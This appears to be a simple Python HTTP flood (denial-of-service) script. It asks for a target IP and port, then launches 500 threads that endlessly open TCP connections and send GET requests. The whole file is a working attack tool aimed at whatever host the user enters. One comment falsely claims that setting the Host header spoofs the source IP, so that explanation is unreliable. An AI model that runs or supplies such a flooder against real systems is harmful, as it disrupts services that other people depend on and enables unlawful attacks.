import threading
import socket

target = input("Enter target IP (x.x.x.x format): ")
port = int(input("Enter target port: "))
fake_ip = '192.168.34.11' #Just to be fun


def attack():
    while True:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Creates a socket, AF_INET = Uses IPv4 addresses, SOCK_STREAM = Use TCP 
        s.connect((target, port)) #Connects to the target at the specified port

        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),(target, port))
        #standard HTTP GET request, asking for the homepage. .encode('ascii') converts the string to bytes since sockets need bytes not strings

        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target, port))
        #spoofing the source IP in the header to make it look like the request is coming from somewhere else
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack) #Uses the attack() function for threading
    thread.start()